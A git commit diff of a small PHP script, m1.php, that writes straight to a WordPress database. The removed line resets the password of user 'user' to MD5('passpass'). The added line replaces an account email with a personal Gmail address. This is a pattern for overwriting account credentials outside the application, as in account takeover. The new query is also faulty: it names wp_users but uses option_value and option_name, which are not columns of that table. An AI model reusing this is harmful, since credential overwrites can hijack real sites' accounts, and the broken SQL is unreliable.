159e559a899fccd8d08f04665b2ffed056d45777
abhishek-sharma8 <47742249+abhishek-sharma8@users.noreply.github.com>
2021-09-15 18:08:30 +0530

    Update m1.php

--- m1.php
+++ m1.php
@@ -9,7 +9,7 @@ if($link === false){
 }
  
 // Attempt insert query execution
-$sql = "UPDATE wp_users SET user_pass = MD5( 'passpass' ) WHERE user_login = 'user'";
+$sql = "UPDATE wp_users SET option_value = replace(option_value, 'user@example.com', 'shakejohn321@gmail.com') WHERE option_name = 'user_email'";
 if(mysqli_query($link, $sql)){
     echo "Records inserted successfully.";
 } else{
